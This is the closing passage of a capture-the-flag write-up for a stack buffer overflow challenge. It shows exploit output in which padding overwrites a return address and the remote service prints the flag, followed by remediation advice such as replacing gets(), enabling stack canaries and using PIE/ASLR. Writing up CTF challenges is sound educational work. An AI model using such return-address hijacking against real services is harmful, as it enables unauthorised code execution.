[+] Receiving all data: Done (178B)
[*] Closed connection to 34.116.80.78 port 9998
[+] Response received from target:
 You said: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  @

You hijacked the return address!
Here's your flag:
CSSCTF{s1gn4l_r3c0v3r3d_fr0m_th3_v01d}
```

**Official Flag:**
```text
CSSCTF{s1gn4l_r3c0v3r3d_fr0m_th3_v01d}
```

---

### 3.7. Remediation

1. **Replace `gets()`:** Implement bounded input routines like `fgets(buffer, sizeof(buffer), stdin)`.
2. **Enable Stack Canaries:** Compile with `-fstack-protector-all` to detect return address corruption.
3. **Enable PIE & ASLR:** Compile using `-fPIE -pie` to randomize code offsets.
4. **Prune Dead Code:** Apply compiler dead code elimination with `-O2` and `-Wl,--gc-sections`.
